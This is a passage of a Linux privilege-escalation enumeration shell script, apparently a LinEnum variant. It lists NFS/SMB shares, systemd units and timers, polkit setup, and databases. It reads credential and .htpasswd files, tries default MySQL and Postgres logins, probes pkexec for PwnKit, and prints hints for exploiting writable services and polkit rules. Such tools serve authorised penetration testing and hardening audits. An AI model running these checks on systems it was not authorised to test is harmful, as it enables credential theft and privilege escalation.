  echo -e "\e[00;33m[+] Mounted NFS shares:\e[00m"
  echo -e "$nfsmounts"
  echo -e "\n"
fi

# Show NFS server status
nfsserver=`systemctl status nfs-server 2>/dev/null | head -5`
if [ "$nfsserver" ]; then
  echo -e "\e[00;31m[-] NFS server status:\e[00m"
  echo -e "$nfsserver"
  echo -e "\n"
fi

# List available NFS shares from localhost
nfsshowmount=`showmount -e localhost 2>/dev/null`
if [ "$nfsshowmount" ]; then
  echo -e "\e[00;33m[+] NFS shares available on localhost:\e[00m"
  echo -e "$nfsshowmount"
  echo -e "\n"
fi

# SMB/CIFS shares in fstab
smbfstab=`grep -E "cifs|smb" /etc/fstab 2>/dev/null`
if [ "$smbfstab" ]; then
  echo -e "\e[00;33m[+] SMB/CIFS shares in /etc/fstab:\e[00m"
  echo -e "$smbfstab"
  echo -e "\n"
  
  # Check for credentials in fstab
  if echo "$smbfstab" | grep -qE "username=|password=|credentials="; then
    HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
    echo -e "\e[00;33m[+] HIGH-VALUE: SMB credentials found in /etc/fstab!\e[00m"
    echo -e "\n"
  fi
fi

# Currently mounted SMB/CIFS shares
smbmounts=`mount | grep -E "cifs|smb" 2>/dev/null`
if [ "$smbmounts" ]; then
  echo -e "\e[00;33m[+] Mounted SMB/CIFS shares:\e[00m"
  echo -e "$smbmounts"
  echo -e "\n"
fi

# Samba configuration
sambaconf=`cat /etc/samba/smb.conf 2>/dev/null | grep -v "^#" | grep -v "^;" | grep -v "^$"`
if [ "$sambaconf" ]; then
  echo -e "\e[00;33m[+] Samba configuration:\e[00m"
  echo -e "$sambaconf"
  echo -e "\n"
  
  # Check for guest access
  if echo "$sambaconf" | grep -qE "guest ok = yes|map to guest"; then
    HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
    echo -e "\e[00;33m[+] HIGH-VALUE: Samba guest access enabled!\e[00m"
    echo -e "\n"
  fi
fi

# List Samba shares
smbshares=`smbclient -L localhost -N 2>/dev/null`
if [ "$smbshares" ]; then
  echo -e "\e[00;33m[+] Samba shares on localhost:\e[00m"
  echo -e "$smbshares"
  echo -e "\n"
fi

# Check for SMB credentials files
smbcredfiles=`find /home /root /etc -name ".smbcredentials" -o -name "smbcredentials" -o -name ".smbpasswd" 2>/dev/null`
if [ "$smbcredfiles" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: SMB credential files found!\e[00m"
  for credfile in $smbcredfiles; do
    echo -e "  \e[00;31m→\e[00m $credfile"
    ls -la "$credfile" 2>/dev/null
  done
  echo -e "\n"
fi

# AutoFS configuration
autofsconf=`cat /etc/auto.master 2>/dev/null | grep -v "^#" | grep -v "^$"`
if [ "$autofsconf" ]; then
  echo -e "\e[00;33m[+] AutoFS configuration:\e[00m"
  echo -e "$autofsconf"
  echo -e "\n"
fi

# Export network share info if export is enabled
if [ "$export" ]; then
  mkdir -p $format/network-shares/ 2>/dev/null
  cat /etc/exports 2>/dev/null > $format/network-shares/nfs-exports.txt
  cat /etc/samba/smb.conf 2>/dev/null > $format/network-shares/smb.conf
  cat /etc/fstab 2>/dev/null | grep -E "nfs|cifs|smb" > $format/network-shares/mounted-shares.txt
fi
}

services_info()
{
echo -e "\e[00;33m### SERVICES #############################################\e[00m" 

#running processes
psaux=`ps aux 2>/dev/null`
if [ "$psaux" ]; then
  echo -e "\e[00;31m[-] Running processes:\e[00m\n$psaux" 
  echo -e "\n"
fi

#lookup process binary path and permissisons
procperm=`ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null`
if [ "$procperm" ]; then
  echo -e "\e[00;31m[-] Process binaries and associated permissions (from above list):\e[00m\n$procperm" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$procperm" ]; then
procpermbase=`ps aux 2>/dev/null | awk '{print $11}' | xargs -r ls 2>/dev/null | awk '!x[$0]++' 2>/dev/null`
  mkdir $format/ps-export/ 2>/dev/null
  for i in $procpermbase; do cp --parents $i $format/ps-export/; done 2>/dev/null
fi

#anything 'useful' in inetd.conf
inetdread=`cat /etc/inetd.conf 2>/dev/null`
if [ "$inetdread" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/inetd.conf:\e[00m\n$inetdread" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$inetdread" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/inetd.conf $format/etc-export/inetd.conf 2>/dev/null
fi

#very 'rough' command to extract associated binaries from inetd.conf & show permisisons of each
inetdbinperms=`awk '{print $7}' /etc/inetd.conf 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$inetdbinperms" ]; then
  echo -e "\e[00;31m[-] The related inetd binary permissions:\e[00m\n$inetdbinperms" 
  echo -e "\n"
fi

xinetdread=`cat /etc/xinetd.conf 2>/dev/null`
if [ "$xinetdread" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/xinetd.conf:\e[00m\n$xinetdread" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$xinetdread" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/xinetd.conf $format/etc-export/xinetd.conf 2>/dev/null
fi

xinetdincd=`grep "/etc/xinetd.d" /etc/xinetd.conf 2>/dev/null`
if [ "$xinetdincd" ]; then
  echo -e "\e[00;31m[-] /etc/xinetd.d is included in /etc/xinetd.conf - associated binary permissions are listed below:\e[00m"; ls -la /etc/xinetd.d 2>/dev/null 
  echo -e "\n"
fi

#very 'rough' command to extract associated binaries from xinetd.conf & show permisisons of each
xinetdbinperms=`awk '{print $7}' /etc/xinetd.conf 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$xinetdbinperms" ]; then
  echo -e "\e[00;31m[-] The related xinetd binary permissions:\e[00m\n$xinetdbinperms" 
  echo -e "\n"
fi

initdread=`ls -la /etc/init.d 2>/dev/null`
if [ "$initdread" ]; then
  echo -e "\e[00;31m[-] /etc/init.d/ binary permissions:\e[00m\n$initdread" 
  echo -e "\n"
fi

#init.d files NOT belonging to root!
initdperms=`find /etc/init.d/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$initdperms" ]; then
  echo -e "\e[00;31m[-] /etc/init.d/ files not belonging to root:\e[00m\n$initdperms" 
  echo -e "\n"
fi

rcdread=`ls -la /etc/rc.d/init.d 2>/dev/null`
if [ "$rcdread" ]; then
  echo -e "\e[00;31m[-] /etc/rc.d/init.d binary permissions:\e[00m\n$rcdread" 
  echo -e "\n"
fi

#init.d files NOT belonging to root!
rcdperms=`find /etc/rc.d/init.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$rcdperms" ]; then
  echo -e "\e[00;31m[-] /etc/rc.d/init.d files not belonging to root:\e[00m\n$rcdperms" 
  echo -e "\n"
fi

usrrcdread=`ls -la /usr/local/etc/rc.d 2>/dev/null`
if [ "$usrrcdread" ]; then
  echo -e "\e[00;31m[-] /usr/local/etc/rc.d binary permissions:\e[00m\n$usrrcdread" 
  echo -e "\n"
fi

#rc.d files NOT belonging to root!
usrrcdperms=`find /usr/local/etc/rc.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$usrrcdperms" ]; then
  echo -e "\e[00;31m[-] /usr/local/etc/rc.d files not belonging to root:\e[00m\n$usrrcdperms" 
  echo -e "\n"
fi

initread=`ls -la /etc/init/ 2>/dev/null`
if [ "$initread" ]; then
  echo -e "\e[00;31m[-] /etc/init/ config file permissions:\e[00m\n$initread"
  echo -e "\n"
fi

# upstart scripts not belonging to root
initperms=`find /etc/init \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$initperms" ]; then
   echo -e "\e[00;31m[-] /etc/init/ config files not belonging to root:\e[00m\n$initperms"
   echo -e "\n"
fi

systemdread=`ls -lthR /lib/systemd/ 2>/dev/null`
if [ "$systemdread" ]; then
  echo -e "\e[00;31m[-] /lib/systemd/* config file permissions:\e[00m\n$systemdread"
  echo -e "\n"
fi

# systemd files not belonging to root
systemdperms=`find /lib/systemd/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$systemdperms" ]; then
   echo -e "\e[00;33m[+] /lib/systemd/* config files not belonging to root:\e[00m\n$systemdperms"
   echo -e "\n"
fi

# Find writable systemd service files (PRIVILEGE ESCALATION VECTOR)
echo -e "\e[00;31m[-] Checking for writable systemd service files...\e[00m"

writablesystemdservices=`find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -type f -writable 2>/dev/null`
if [ "$writablesystemdservices" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Writable systemd service files found!\e[00m"
  for service in $writablesystemdservices; do
    echo -e "  \e[00;31m→\e[00m $service"
    ls -la "$service" 2>/dev/null
  done
  echo -e "\n\e[00;36m[!] Exploitation: Modify ExecStart to execute malicious commands\e[00m"
  echo -e "\n"
fi

# Check for writable systemd unit directories
writablesystemddirs=`find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -type d -writable 2>/dev/null`
if [ "$writablesystemddirs" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Writable systemd unit directories found!\e[00m"
  for dir in $writablesystemddirs; do
    echo -e "  \e[00;31m→\e[00m $dir"
    ls -ld "$dir" 2>/dev/null
  done
  echo -e "\n\e[00;36m[!] Exploitation: Create malicious service files in these directories\e[00m"
  echo -e "\n"
fi

# Check for systemd service files with weak permissions (world/group writable)
weakpermsservices=`find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -type f \( -perm -002 -o -perm -020 \) 2>/dev/null`
if [ "$weakpermsservices" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Systemd service files with weak permissions:\e[00m"
  for service in $weakpermsservices; do
    echo -e "  \e[00;31m→\e[00m $service"
    ls -la "$service" 2>/dev/null
  done
  echo -e "\n"
fi

# Check for systemd timer files (can trigger services)
echo -e "\e[00;31m[-] Checking systemd timers for abuse opportunities...\e[00m"

writabletimers=`find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -name "*.timer" -type f -writable 2>/dev/null`
if [ "$writabletimers" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Writable systemd timer files found!\e[00m"
  for timer in $writabletimers; do
    echo -e "  \e[00;31m→\e[00m $timer"
    ls -la "$timer" 2>/dev/null
    
    # Show timer configuration
    timerunit=`grep -E "OnCalendar|OnBootSec|OnUnitActiveSec|OnActiveSec|Unit=" "$timer" 2>/dev/null`
    if [ "$timerunit" ]; then
      echo -e "    \e[00;36mConfiguration:\e[00m"
      echo -e "$timerunit" | sed 's/^/      /'
    fi
  done
  echo -e "\n\e[00;36m[!] Exploitation: Modify timer to execute service at desired time\e[00m"
  echo -e "\n"
fi

# List all active/enabled timers
activetimers=`systemctl list-timers --all --no-pager --no-legend 2>/dev/null`
if [ "$activetimers" ]; then
  echo -e "\e[00;33m[+] Active/Enabled systemd timers:\e[00m"
  echo -e "$activetimers" | head -20
  echo -e "\n"
  
  # Check if any active timer files are writable
  activetimerwritable=""
  for timer in `systemctl list-timers --all --no-pager --no-legend 2>/dev/null | awk '{print $NF}'`; do
    timerpath=`systemctl show -p FragmentPath "$timer" 2>/dev/null | cut -d= -f2`
    if [ -n "$timerpath" ] && [ -w "$timerpath" 2>/dev/null ]; then
      activetimerwritable="$activetimerwritable\n  → $timer ($timerpath)"
    fi
  done
  
  if [ -n "$activetimerwritable" ]; then
    HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
    echo -e "\e[00;33m[+] HIGH-VALUE: Writable configs for ACTIVE timers!\e[00m"
    echo -e "$activetimerwritable"
    echo -e "\n\e[00;36m[!] Critical: Modify timer and wait for next trigger or restart\e[00m"
    echo -e "\n"
  fi
fi

# Check for timer-associated service files
echo -e "\e[00;31m[-] Analyzing timer-associated service files...\e[00m"
alltimers=`find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -name "*.timer" -type f 2>/dev/null`
writabletimerservices=""
for timer in $alltimers; do
  # Extract associated service unit
  serviceunit=`grep "^Unit=" "$timer" 2>/dev/null | cut -d= -f2`
  if [ -z "$serviceunit" ]; then
    # Default: timer name with .service extension
    serviceunit=`basename "$timer" .timer`.service
  fi
  
  # Find the service file
  servicepath=""
  for dir in /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system; do
    if [ -f "$dir/$serviceunit" ]; then
      servicepath="$dir/$serviceunit"
      break
    fi
  done
  
  # Check if service file is writable
  if [ -n "$servicepath" ] && [ -w "$servicepath" 2>/dev/null ]; then
    timername=`basename "$timer"`
    writabletimerservices="$writabletimerservices\n  → Timer: $timername → Service: $servicepath"
  fi
done

if [ -n "$writabletimerservices" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Writable service files triggered by timers!\e[00m"
  echo -e "$writabletimerservices"
  echo -e "\n\e[00;36m[!] Exploitation: Modify service file to execute malicious commands when timer triggers\e[00m"
  echo -e "\n"
fi

# Check for timers with weak permissions (world/group writable)
weakpertimers=`find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -name "*.timer" -type f \( -perm -002 -o -perm -020 \) 2>/dev/null`
if [ "$weakpertimers" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Systemd timer files with weak permissions:\e[00m"
  for timer in $weakpertimers; do
    echo -e "  \e[00;31m→\e[00m $timer"
    ls -la "$timer" 2>/dev/null
  done
  echo -e "\n"
fi

# Check for timer directories with write access
timerwritabledirs=`find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -type d -name "*.timer.d" -writable 2>/dev/null`
if [ "$timerwritabledirs" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Writable timer drop-in directories:\e[00m"
  for dir in $timerwritabledirs; do
    echo -e "  \e[00;31m→\e[00m $dir"
    ls -ld "$dir" 2>/dev/null
  done
  echo -e "\n\e[00;36m[!] Exploitation: Create override .conf files to modify timer behavior\e[00m"
  echo -e "\n"
fi

# Check for timers owned by non-root users
nonroottimers=`find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -name "*.timer" -type f \! -uid 0 2>/dev/null`
if [ "$nonroottimers" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Systemd timer files not owned by root:\e[00m"
  for timer in $nonroottimers; do
    echo -e "  \e[00;31m→\e[00m $timer"
    ls -la "$timer" 2>/dev/null
  done
  echo -e "\n"
fi

# Export timer files if export is enabled
if [ "$export" ]; then
  mkdir -p $format/systemd-timers/ 2>/dev/null
  if [ "$writabletimers" ]; then
    for i in $writabletimers; do 
      cp --parents $i $format/systemd-timers/ 2>/dev/null
    done
  fi
fi

# Check for systemd socket files (can be used for activation)
writablesockets=`find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -name "*.socket" -type f -writable 2>/dev/null`
if [ "$writablesockets" ]; then
  echo -e "\e[00;33m[+] Writable systemd socket files found:\e[00m"
  for socket in $writablesockets; do
    echo -e "  \e[00;31m→\e[00m $socket"
    ls -la "$socket" 2>/dev/null
  done
  echo -e "\n"
fi

# Check for systemd path units (file system triggers)
writablepaths=`find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -name "*.path" -type f -writable 2>/dev/null`
if [ "$writablepaths" ]; then
  echo -e "\e[00;33m[+] Writable systemd path files found:\e[00m"
  for path in $writablepaths; do
    echo -e "  \e[00;31m→\e[00m $path"
    ls -la "$path" 2>/dev/null
  done
  echo -e "\n"
fi

# Check for systemd drop-in directories (override configurations)
writabledropins=`find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -name "*.d" -type d -writable 2>/dev/null`
if [ "$writabledropins" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Writable systemd drop-in directories:\e[00m"
  for dropin in $writabledropins; do
    echo -e "  \e[00;31m→\e[00m $dropin"
    ls -ld "$dropin" 2>/dev/null
  done
  echo -e "\n\e[00;36m[!] Exploitation: Create .conf files to override service configuration\e[00m"
  echo -e "\n"
fi

# Analyze running services for modification opportunities
echo -e "\e[00;31m[-] Checking currently running services for writable configs...\e[00m"
runningservices=`systemctl list-units --type=service --state=running --no-pager --no-legend 2>/dev/null | awk '{print $1}'`
if [ "$runningservices" ]; then
  writablerunning=""
  for svc in $runningservices; do
    svcpath=`systemctl show -p FragmentPath $svc 2>/dev/null | cut -d= -f2`
    if [ -n "$svcpath" ] && [ -w "$svcpath" 2>/dev/null ]; then
      writablerunning="$writablerunning\n  → $svc ($svcpath)"
    fi
  done
  
  if [ -n "$writablerunning" ]; then
    HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
    echo -e "\e[00;33m[+] HIGH-VALUE: Writable configs for RUNNING services!\e[00m"
    echo -e "$writablerunning"
    echo -e "\n\e[00;36m[!] Critical: Modify and restart service for immediate execution\e[00m"
    echo -e "\n"
  fi
fi

# Check for writable systemd configuration files
systemdconfigs=`find /etc/systemd -name "*.conf" -type f -writable 2>/dev/null`
if [ "$systemdconfigs" ]; then
  echo -e "\e[00;33m[+] Writable systemd configuration files:\e[00m"
  for conf in $systemdconfigs; do
    echo -e "  \e[00;31m→\e[00m $conf"
    ls -la "$conf" 2>/dev/null
  done
  echo -e "\n"
fi

# Export writable service files if export is enabled
if [ "$export" ] && [ "$writablesystemdservices" ]; then
  mkdir $format/writable-services/ 2>/dev/null
  for i in $writablesystemdservices; do 
    cp --parents $i $format/writable-services/ 2>/dev/null
  done
fi
}

software_configs()
{
echo -e "\e[00;33m### SOFTWARE #############################################\e[00m" 

#sudo version - check to see if there are any known vulnerabilities with this
sudover=`sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null`
if [ "$sudover" ]; then
  echo -e "\e[00;31m[-] Sudo version:\e[00m\n$sudover" 
  echo -e "\n"
fi

# Polkit/pkexec Vulnerability Checks (PRIVILEGE ESCALATION VECTOR)
echo -e "\e[00;31m[-] Checking Polkit/pkexec for misconfigurations and vulnerabilities...\e[00m"

# Check if pkexec is installed and SUID
pkexecbin=`which pkexec 2>/dev/null`
if [ "$pkexecbin" ]; then
  echo -e "\e[00;33m[+] pkexec binary found:\e[00m $pkexecbin"
  pkexecperms=`ls -la $pkexecbin 2>/dev/null`
  echo -e "$pkexecperms"
  
  # Check if SUID bit is set
  if [ -u "$pkexecbin" ]; then
    HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
    echo -e "\e[00;33m[+] HIGH-VALUE: pkexec has SUID bit set!\e[00m"
    echo -e "\n\e[00;36m[!] Known CVEs: CVE-2021-4034 (PwnKit), CVE-2021-3560\e[00m"
    echo -e "\e[00;36m[!] Check version and test for vulnerabilities\e[00m"
  fi
  echo -e "\n"
fi

# Check polkit version for known vulnerabilities
polkitver=`pkexec --version 2>/dev/null || polkitd --version 2>/dev/null`
if [ "$polkitver" ]; then
  echo -e "\e[00;31m[-] Polkit version:\e[00m\n$polkitver"
  echo -e "\n"
fi

# Check for writable polkit configuration files
writablepolkitconf=`find /etc/polkit-1 /usr/share/polkit-1 -type f -writable 2>/dev/null`
if [ "$writablepolkitconf" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Writable polkit configuration files found!\e[00m"
  for conf in $writablepolkitconf; do
    echo -e "  \e[00;31m→\e[00m $conf"
    ls -la "$conf" 2>/dev/null
  done
  echo -e "\n\e[00;36m[!] Exploitation: Modify polkit rules to grant unauthorized privileges\e[00m"
  echo -e "\n"
fi

# Check for writable polkit rules directories
writablepolkitdirs=`find /etc/polkit-1/rules.d /etc/polkit-1/localauthority /usr/share/polkit-1/rules.d -type d -writable 2>/dev/null`
if [ "$writablepolkitdirs" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Writable polkit rules directories!\e[00m"
  for dir in $writablepolkitdirs; do
    echo -e "  \e[00;31m→\e[00m $dir"
    ls -ld "$dir" 2>/dev/null
  done
  echo -e "\n\e[00;36m[!] Exploitation: Create malicious polkit rules for privilege escalation\e[00m"
  echo -e "\n"
fi

# Check for polkit rules that may allow privilege escalation
echo -e "\e[00;31m[-] Analyzing polkit rules for privilege escalation vectors...\e[00m"
polkitrules=`find /etc/polkit-1/rules.d /usr/share/polkit-1/rules.d -name "*.rules" 2>/dev/null`
if [ "$polkitrules" ]; then
  echo -e "\e[00;33m[+] Polkit rules found:\e[00m"
  for rule in $polkitrules; do
    echo -e "  \e[00;31m→\e[00m $rule"
    # Check for overly permissive rules
    permissive=`grep -i "return polkit.Result.YES" "$rule" 2>/dev/null`
    if [ "$permissive" ]; then
      echo -e "    \e[00;33m[!] Contains permissive rules (polkit.Result.YES)\e[00m"
    fi
  done
  echo -e "\n"
fi

# Check for polkit local authority files
localauth=`find /etc/polkit-1/localauthority /var/lib/polkit-1/localauthority -type f 2>/dev/null`
if [ "$localauth" ]; then
  echo -e "\e[00;33m[+] Polkit local authority files:\e[00m"
  for auth in $localauth; do
    echo -e "  \e[00;31m→\e[00m $auth"
    ls -la "$auth" 2>/dev/null
  done
  echo -e "\n"
fi

# Check for pkexec in sudoers or sudo-like configurations
pkexecsudo=`grep -r "pkexec" /etc/sudoers /etc/sudoers.d/ 2>/dev/null`
if [ "$pkexecsudo" ]; then
  echo -e "\e[00;33m[+] pkexec mentioned in sudoers configuration:\e[00m"
  echo -e "$pkexecsudo"
  echo -e "\n"
fi

# Check for polkit actions that allow password-less authentication
passwordlessactions=`find /usr/share/polkit-1/actions -name "*.policy" -exec grep -l "allow_any.*yes" {} \; 2>/dev/null`
if [ "$passwordlessactions" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Polkit actions with password-less authentication:\e[00m"
  for action in $passwordlessactions; do
    echo -e "  \e[00;31m→\e[00m $action"
    grep -A2 -B2 "allow_any.*yes" "$action" 2>/dev/null
  done
  echo -e "\n"
fi

# Check for CVE-2021-4034 (PwnKit) vulnerability indicators
echo -e "\e[00;31m[-] Checking for CVE-2021-4034 (PwnKit) vulnerability...\e[00m"
if [ -u "$pkexecbin" ]; then
  # Test if pkexec can be exploited (basic check)
  pwnkittest=`GCONV_PATH=. pkexec echo 2>&1 | grep -i "error\|cannot"`
  if [ -z "$pwnkittest" ]; then
    HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
    echo -e "\e[00;33m[+] HIGH-VALUE: System may be vulnerable to CVE-2021-4034 (PwnKit)!\e[00m"
    echo -e "\e[00;36m[!] Exploitation: Use PwnKit exploit for root shell\e[00m"
    echo -e "\e[00;36m[!] Command: https://github.com/ly4k/PwnKit\e[00m"
  else
    echo -e "\e[00;32m[+] System appears patched against CVE-2021-4034\e[00m"
  fi
  echo -e "\n"
fi

# Check for CVE-2021-3560 vulnerability (polkit DBus)
echo -e "\e[00;31m[-] Checking for CVE-2021-3560 vulnerability...\e[00m"
polkitdbin=`which polkitd 2>/dev/null`
if [ "$polkitdbin" ]; then
  polkitdver=`polkitd --version 2>/dev/null | grep -oE "[0-9]+\.[0-9]+"`
  if [ "$polkitdver" ]; then
    # Vulnerable versions: < 0.119
    echo -e "\e[00;33m[+] Polkitd version detected: $polkitdver\e[00m"
    echo -e "\e[00;36m[!] Check if version < 0.119 (vulnerable to CVE-2021-3560)\e[00m"
  fi
  echo -e "\n"
fi

# Check for writable polkit helper binaries
polkitagent=`which polkit-agent-helper-1 2>/dev/null`
if [ "$polkitagent" ] && [ -w "$polkitagent" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Writable polkit-agent-helper-1 binary!\e[00m"
  ls -la "$polkitagent"
  echo -e "\n"
fi

# Check for polkit configuration allowing unauthorized users
unauthorizedconf=`grep -r "Identity=unix-user:\*" /etc/polkit-1 /usr/share/polkit-1 2>/dev/null`
if [ "$unauthorizedconf" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: Polkit configuration allowing all users:\e[00m"
  echo -e "$unauthorizedconf"
  echo -e "\n"
fi

# Export polkit files if export is enabled
if [ "$export" ]; then
  mkdir -p $format/polkit-configs/ 2>/dev/null
  if [ "$writablepolkitconf" ]; then
    for i in $writablepolkitconf; do 
      cp --parents $i $format/polkit-configs/ 2>/dev/null
    done
  fi
  if [ "$polkitrules" ]; then
    for i in $polkitrules; do 
      cp --parents $i $format/polkit-configs/ 2>/dev/null
    done
  fi
fi

#mysql details - if installed
mysqlver=`mysql --version 2>/dev/null`
if [ "$mysqlver" ]; then
  echo -e "\e[00;31m[-] MYSQL version:\e[00m\n$mysqlver" 
  echo -e "\n"
fi

#checks to see if root/root will get us a connection
mysqlconnect=`mysqladmin -uroot -proot version 2>/dev/null`
if [ "$mysqlconnect" ]; then
  echo -e "\e[00;33m[+] We can connect to the local MYSQL service with default root/root credentials!\e[00m\n$mysqlconnect" 
  echo -e "\n"
fi

#mysql version details
mysqlconnectnopass=`mysqladmin -uroot version 2>/dev/null`
if [ "$mysqlconnectnopass" ]; then
  echo -e "\e[00;33m[+] We can connect to the local MYSQL service as 'root' and without a password!\e[00m\n$mysqlconnectnopass" 
  echo -e "\n"
fi

#postgres details - if installed
postgver=`psql -V 2>/dev/null`
if [ "$postgver" ]; then
  echo -e "\e[00;31m[-] Postgres version:\e[00m\n$postgver" 
  echo -e "\n"
fi

#checks to see if any postgres password exists and connects to DB 'template0' - following commands are a variant on this
postcon1=`psql -U postgres -w template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon1" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'postgres' with no password!:\e[00m\n$postcon1" 
  echo -e "\n"
fi

postcon11=`psql -U postgres -w template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon11" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'postgres' with no password!:\e[00m\n$postcon11" 
  echo -e "\n"
fi

postcon2=`psql -U pgsql -w template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon2" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'psql' with no password!:\e[00m\n$postcon2" 
  echo -e "\n"
fi

postcon22=`psql -U pgsql -w template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon22" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'psql' with no password!:\e[00m\n$postcon22" 
  echo -e "\n"
fi

#apache details - if installed
apachever=`apache2 -v 2>/dev/null; httpd -v 2>/dev/null`
if [ "$apachever" ]; then
  echo -e "\e[00;31m[-] Apache version:\e[00m\n$apachever" 
  echo -e "\n"
fi

#what account is apache running under
apacheusr=`grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null |awk '{sub(/.*\export /,"")}1' 2>/dev/null`
if [ "$apacheusr" ]; then
  echo -e "\e[00;31m[-] Apache user configuration:\e[00m\n$apacheusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$apacheusr" ]; then
  mkdir --parents $format/etc-export/apache2/ 2>/dev/null
  cp /etc/apache2/envvars $format/etc-export/apache2/envvars 2>/dev/null
fi

#installed apache modules
apachemodules=`apache2ctl -M 2>/dev/null; httpd -M 2>/dev/null`
if [ "$apachemodules" ]; then
  echo -e "\e[00;31m[-] Installed Apache modules:\e[00m\n$apachemodules" 
  echo -e "\n"
fi

#htpasswd check
htpasswd=`find / -name .htpasswd -print -exec cat {} \; 2>/dev/null`
if [ "$htpasswd" ]; then
    echo -e "\e[00;33m[-] htpasswd found - could contain passwords:\e[00m\n$htpasswd"
    echo -e "\n"
fi

#anything in the default http home dirs (a thorough only check as output can be large)
if [ "$thorough" = "1" ]; then
  apachehomedirs=`ls -alhR /var/www/ 2>/dev/null; ls -alhR /srv/www/htdocs/ 2>/dev/null; ls -alhR /usr/local/www/apache2/data/ 2>/dev/null; ls -alhR /opt/lampp/htdocs/ 2>/dev/null`
  if [ "$apachehomedirs" ]; then
    echo -e "\e[00;31m[-] www home dir contents:\e[00m\n$apachehomedirs" 
    echo -e "\n"
  fi
fi

}

interesting_files()
{
echo -e "\e[00;33m### INTERESTING FILES ####################################\e[00m" 

#checks to see if various files are installed
echo -e "\e[00;31m[-] Useful file locations:\e[00m" ; which nc 2>/dev/null ; which netcat 2>/dev/null ; which wget 2>/dev/null ; which nmap 2>/dev/null ; which gcc 2>/dev/null; which curl 2>/dev/null 
echo -e "\n" 

#limited search for installed compilers
compiler=`dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null`
if [ "$compiler" ]; then
  echo -e "\e[00;31m[-] Installed compilers:\e[00m\n$compiler" 
  echo -e "\n"
fi

#manual check - lists out sensitive files, can we read/modify etc.
